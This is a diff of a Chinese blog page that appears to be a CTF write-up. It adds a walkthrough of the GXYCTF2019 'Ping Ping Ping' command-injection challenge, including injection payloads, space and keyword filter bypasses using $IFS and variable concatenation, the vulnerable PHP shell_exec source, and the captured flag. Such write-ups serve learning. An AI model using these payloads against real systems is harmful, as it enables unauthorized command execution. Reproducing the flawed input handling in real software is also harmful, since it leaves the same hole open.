@@ -16,7 +16,7 @@
 <meta property="og:description" content="命令执行常见管道符命令执行">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-09-13T01:23:55.000Z">
-<meta property="article:modified_time" content="2022-09-13T01:24:24.755Z">
+<meta property="article:modified_time" content="2022-09-17T10:06:11.332Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -179,6 +179,37 @@
 <li>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag 或 127.0.0.1 &amp; cat &#x2F;flag</li>
 <li>得flag</li>
 </ol>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><ol>
+<li>?ip&#x3D;127.0.0.1;ls</li>
+<li>?ip&#x3D;127.0.0.1;cat flag.php</li>
+</ol>
+<p>​      回显：&#x2F;?ip&#x3D; fxck your space! 过滤了空格</p>
+<ol start="3">
+<li>cat%09flag.php</li>
+</ol>
+<p>​                &#x2F;?ip&#x3D; 1fxck your symbol! 过滤了特殊字符</p>
+<ol start="4">
+<li>{IFS}绕过 cat${IFS}flag.php</li>
+</ol>
+<p>​                还是过滤了特殊字符，应该是花括号</p>
+<ol start="5">
+<li>cat$IFS$9flag.php</li>
+</ol>
+<p>​                &#x2F;?ip&#x3D; fxck your flag! 过滤了flag</p>
+<ol start="6">
+<li>cat$INF$9index.php看源码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">	/?ip=</span><br><span class="line"></span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes </span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;    </span></span><br><span class="line"><span class="string">	echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">    else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">    else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">    else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">    $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">    echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>拼接过滤</li>
+</ol>
+<p>​    127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</p>
+<ol start="8">
+<li>flag在源码里</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;05d74616-1b1e-4ce5-8dbc-fade71987137&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
       
 
